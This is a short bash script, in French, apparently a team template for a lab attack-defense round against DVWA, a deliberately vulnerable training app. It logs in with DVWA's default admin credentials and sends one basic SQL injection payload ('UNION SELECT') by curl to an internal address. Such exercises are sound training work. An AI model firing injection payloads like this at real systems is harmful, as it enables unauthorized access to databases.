#!/bin/bash
# =============================================================================
#  payloads.sh — Equipe 4 — Round 1 (Injection SQL)
#
#  Usage (apres avoir deploye les regles adverses) :
#    bash attacks/equipe-4/payloads.sh <ip_dvwa>
#
#  Par defaut cible : dvwa (nom Docker)
# =============================================================================

TARGET="${1:-dvwa}"
PORT="80"
COOKIE_FILE="/tmp/dvwa_eq4.txt"

echo "=== Equipe 4 — Attaques R1 (Injection SQL) ==="
echo "Cible : $TARGET:$PORT"
echo ""

# Authentification DVWA
curl -s -c "$COOKIE_FILE" \
  -d "username=admin&password=password&Login=Login" \
  "http://$TARGET:$PORT/login.php" -L -o /dev/null
echo "[*] Cookie recupere"
echo ""

# ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
# echo "[1] Payload basique..."
 curl -X POST http://172.22.0.20:8080/ -d "id=1 UNION SELECT 1,2"


